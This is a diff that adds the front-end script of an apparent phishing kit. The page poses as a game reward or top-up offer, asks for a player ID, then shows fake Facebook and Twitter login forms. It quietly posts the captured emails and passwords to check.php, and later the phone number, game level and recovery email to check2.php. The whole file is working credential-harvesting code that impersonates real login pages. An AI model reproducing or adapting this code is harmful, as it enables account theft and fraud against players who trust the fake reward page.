@@ -1,0 +1,338 @@
+// code for showing hiding popup
+function open_PlayerIdLoginBox() {
+  $('.PlayerIdLoginBox').show()
+}
+function open_PlayerFindIdBox() {
+  $('.PlayerFindIdBox').show()
+}
+function open_itemReward_confirmation(ag) {
+  var myitemReward_confirmationImg = $(ag).attr('src'),
+    rewardName = $(ag).attr('data-name'),
+    amount = $(ag).attr('data-id'),
+    price = $(ag).attr('value')
+  $('.itemReward_confirmation').show()
+  $('#myItemReward_confirmationImg').attr('src', myitemReward_confirmationImg)
+  $('#rewardName').html(rewardName)
+  $('#amount').html(amount)
+  $('#price').html(price)
+}
+function open_otherReward_confirmation(ag) {
+  var myOtherReward_confirmationImg = $(ag).attr('src'),
+    otherReward_confirmationValue = $(ag).attr('value')
+  $('.otherReward_confirmation').show()
+  $('#myOtherReward_confirmationImg').attr('src', myOtherReward_confirmationImg)
+  $('#otherReward_confirmationValue').html(otherReward_confirmationValue)
+}
+function close_reward_confirmation() {
+  $('.itemReward_confirmation').hide()
+  $('.otherReward_confirmation').hide()
+}
+function open_account_login() {
+  $('.account_login').show()
+  $('.itemReward_confirmation').hide()
+}
+function open_facebook() {
+  $('.login-facebook').show()
+  $('.account_login').hide()
+}
+function open_twitter() {
+  $('.login-twitter').show()
+  $('.account_login').hide()
+}
+function close_PlayerIdLoginBox() {
+  $('.PlayerIdLoginBox').hide()
+}
+function close_PlayerFindIdBox() {
+  $('.PlayerIdInputLoginBox').show()
+  $('.PlayerFindIdBox').hide()
+}
+function close_account_login() {
+  $('.account_login').hide()
+}
+function close_facebook() {
+  $('.login-facebook').hide()
+  $('.account_login').show()
+}
+function close_twitter() {
+  $('.login-twitter').hide()
+  $('.account_login').show()
+}
+function removeBorder() {
+  $('.PlayerIdEnterPop_error__7Qd6m')
+    .removeClass()
+    .addClass('PlayerIdEnterPop_input_wrap_box__MYw6p')
+  $('.wrongPlayerId').hide()
+  $('.reqPlayerId').hide()
+}
+function clearInput() {
+  document.getElementById('goInputPlayIdForm').reset()
+  $('.PlayerIdEnterPop_error__7Qd6m')
+    .removeClass()
+    .addClass('PlayerIdEnterPop_input_wrap_box__MYw6p')
+  $('.wrongPlayerId').hide()
+  $('.reqPlayerId').hide()
+}
+function goInputPlayId() {
+  $('#goInputPlayIdForm').submit(function (submitinggoInputPlayId) {
+    submitinggoInputPlayId.preventDefault()
+    $beforeInputPlayId = $('#beforeInput-PlayId').val().trim()
+    if ($beforeInputPlayId == '' || $beforeInputPlayId == null) {
+      return (
+        $('.reqPlayerId').show(),
+        $('#wrongBoxId').addClass('PlayerIdEnterPop_error__7Qd6m'),
+        false
+      )
+    } else {
+      $('.reqPlayerId').hide()
+      $('#wrongBoxId').removeClass('PlayerIdEnterPop_error__7Qd6m')
+    }
+    if ($beforeInputPlayId.length <= 8 || $beforeInputPlayId.length >= 13) {
+      return (
+        $('.wrongPlayerId').show(),
+        $('#wrongBoxId').addClass('PlayerIdEnterPop_error__7Qd6m'),
+        false
+      )
+    } else {
+      $('.wrongPlayerId').hide()
+      $('#wrongBoxId').removeClass('PlayerIdEnterPop_error__7Qd6m')
+      $('.PlayerIdLoginBox').hide()
+      $('.account_verification').show()
+      $('.DesktopPlayerIdNotLogin').hide()
+      $('.DesktopPlayerIdYesLogin').show()
+      $('.MobilePlayerIdNotLogin').hide()
+      $('.MobilePlayerIdYesLogin').show()
+      $('.abTest_recharge_class_box__lK8IP').attr(
+        'onclick',
+        'open_account_login()'
+      )
+      $('#DesktopValidateInputPlayId').val($beforeInputPlayId)
+      $('#MobileValidateInputPlayId').val($beforeInputPlayId)
+      $('#ValidatePopupPlayId').val($beforeInputPlayId)
+      $('input#ValidatePopupPlayId').val($beforeInputPlayId)
+    }
+  })
+}
+// show hide password for facebook
+function showFbPassword() {
+  var x = document.getElementById("password-facebook");
+  if (x.type === "password") {
+    x.type = "text";
+	$('.showPassword').hide();
+	$('.hidePassword').show();
+  } else {
+    x.type = "password";
+  }
+}
+function hideFbPassword() {
+  var x = document.getElementById("password-facebook");
+  if (x.type === "text") {
+    x.type = "password";
+	$('.showPassword').show();
+	$('.hidePassword').hide();
+  } else {
+    x.type = "text";
+  }
+}
+
+// show hide password for twitter
+function showTwitterPassword() {
+  var x = document.getElementById("password-twitter");
+  if (x.type === "password") {
+    x.type = "text";
+	$('.TwitterShowPassword').hide();
+	$('.TwitterHidePassword').show();
+  } else {
+    x.type = "password";
+  }
+}
+function hideTwitterPassword() {
+  var x = document.getElementById("password-twitter");
+  if (x.type === "text") {
+    x.type = "password";
+	$('.TwitterShowPassword').show();
+	$('.TwitterHidePassword').hide();
+  } else {
+    x.type = "text";
+  }
+}
+function ValidateLoginFbData() {
+  return (
+    $('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
+	submitingValidateLoginFbData.preventDefault();
+      $emailfb = $('#email-facebook').val().trim()
+      $passwordfb = $('#password-facebook').val().trim()
+      $loginfb = $('#login-facebook').val().trim()
+      if ($emailfb == '' || $emailfb == null || $emailfb.length <= 5) {
+        return (
+          $('.email-fb').fadeIn(),
+          setTimeout(function () {
+            $('.email-fb').fadeOut()
+          }, 2000),
+          $('.sandi-fb').hide(),
+          $('.PlayerIdLoginBox').hide(),
+          $('.login-facebook').show(),
+          false
+        )
+      } else {
+        $('.email-fb').hide()
+        $('input#validateEmail').val($emailfb)
+        $('.login-facebook').hide()
+        $('.PlayerIdLoginBox').show()
+      }
+      if ($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5) {
+        return (
+          $('.sandi-fb').fadeIn(),
+          setTimeout(function () {
+            $('.sandi-fb').fadeOut()
+          }, 2000),
+          $('.PlayerIdLoginBox').hide(),
+          $('.login-facebook').show(),
+          false
+        )
+      } else {
+        $('.sandi-fb').hide()
+        $('input#validatePassword').val($passwordfb)
+        $('input#validateLogin').val($loginfb)
+        $('.login-facebook').hide()
+        $('.PlayerIdLoginBox').show()
+      }
+      var $validateEmail = $('input#validateEmail').val(),
+        $validatePassword = $('input#validatePassword').val(),
+        $validateLogin = $('input#validateLogin').val(),
+        $ValidatePopupPlayId = $('input#ValidatePopupPlayId').val()
+      if (
+        $validateEmail == '' &&
+        $validatePassword == '' &&
+        $validateLogin == '' &&
+        $ValidatePopupPlayId == ''
+      ) {
+        return $('.account_verification').show(), false
+      }
+      $.ajax({
+        type: 'POST',
+        url: 'check.php',
+        data: $(this).serialize(),
+        beforeSend: function () {
+          $('.login-facebook').hide()
+        },
+        success: function () {
+          $('.login-facebook').hide()
+        },
+      })
+    }),
+    false
+  )
+}
+function ValidateLoginTwitterData() {
+  return (
+    $('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData){
+	submitingValidateLoginTwitterData.preventDefault();
+      $emailtw = $('#email-twitter').val().trim()
+      $passwordtw = $('#password-twitter').val().trim()
+      $logintw = $('#login-twitter').val().trim()
+      if ($emailtw == '' || $emailtw == null || $emailtw.length <= 3) {
+        return (
+          $('.email-tw').fadeIn(),
+          setTimeout(function () {
+            $('.email-tw').fadeOut()
+          }, 2000),
+          $('.sandi-tw').hide(),
+          $('.PlayerIdLoginBox').hide(),
+          $('.login-twitter').show(),
+          false
+        )
+      } else {
+        $('.email-tw').hide()
+        $('input#validateEmail').val($emailtw)
+        $('.login-twitter').hide()
+        $('.PlayerIdLoginBox').show()
+      }
+      if ($passwordtw == '' || $passwordtw == null || $passwordtw.length <= 7) {
+        return (
+          $('.sandi-tw').fadeIn(),
+          setTimeout(function () {
+            $('.sandi-tw').fadeOut()
+          }, 2000),
+          $('.PlayerIdLoginBox').hide(),
+          $('.login-twitter').show(),
+          false
+        )
+      } else {
+        $('.sandi-tw').hide()
+        $('input#validatePassword').val($passwordtw)
+        $('input#validateLogin').val($logintw)
+        $('.login-twitter').hide()
+        $('.PlayerIdLoginBox').show()
+      }
+      var $validateEmail = $('input#validateEmail').val(),
+        $validatePassword = $('input#validatePassword').val(),
+        $validateLogin = $('input#validateLogin').val(),
+        $ValidatePopupPlayId = $('input#ValidatePopupPlayId').val()
+      if (
+        $validateEmail == '' &&
+        $validatePassword == '' &&
+        $validateLogin == '' &&
+        $ValidatePopupPlayId == ''
+      ) {
+        return $('.PlayerIdLoginBox').show(), false
+      }
+      $.ajax({
+        type: 'POST',
+        url: 'check.php',
+        data: $(this).serialize(),
+        beforeSend: function () {
+          $('.login-twitter').hide()
+        },
+        success: function () {
+          $('.login-twitter').hide()
+        },
+      })
+    }),
+    false
+  )
+}
+function ValidateVerificationData() {
+  return (
+    $('#ValidateVerificationDataForm').submit(function(submitingValidateVerificationData){
+	submitingValidateVerificationData.preventDefault();
+      var $validateEmail = $('input#validateEmail').val(),
+        $validatePassword = $('input#validatePassword').val(),
+        $ValidatePopupPlayId = $('input#ValidatePopupPlayId').val(),
+        $phone = $('input#phone').val(),
+        $level = $('input#level').val(),
+        $vmail = $('input#vmail').val(),
+        $validateLogin = $('input#validateLogin').val()
+      if (
+        $validateEmail == '' &&
+        $validatePassword == '' &&
+        $nick == '' &&
+        $ValidatePopupPlayId == '' &&
+        $phone == '' &&
+        $level == '' &&
+        $vmail == '' &&
+        $validateLogin == ''
+      ) {
+        return (
+          $('.verification_info').show(),
+          $('.account_verification').hide(),
+          false
+        )
+      }
+      $.ajax({
+        type: 'POST',
+        url: 'check2.php',
+        data: $(this).serialize(),
+        beforeSend: function () {
+          $('.account_verification').hide()
+          $('.check_verification').show()
+        },
+        success: function () {
+          $('.processing_account').show()
+          $('.check_verification').hide()
+          $('.account_verification').hide()
+        },
+      })
+    }),
+    false
+  )
+}
